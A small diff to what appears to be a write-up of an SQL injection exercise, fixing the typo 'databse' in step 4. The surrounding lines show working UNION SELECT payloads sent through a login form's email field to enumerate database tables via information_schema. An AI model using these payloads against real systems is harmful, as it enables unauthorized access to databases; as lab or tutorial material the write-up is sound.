@@ -22,7 +22,7 @@ email=a@.com' UNION SELECT NULL,NULL,NULL,'test'-- -&password=esdfs
 ```
 ![image](https://user-images.githubusercontent.com/87831546/142858377-8c3d41cc-6858-42b1-8b05-706eb6dfa9e5.png)
 
-4) Find databse names - gives us an interesting table name called 'user'
+4) Find database names - gives us an interesting table name called 'user'
 ```
 email=a@a.com' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables -- -&password=esdfs
 ```
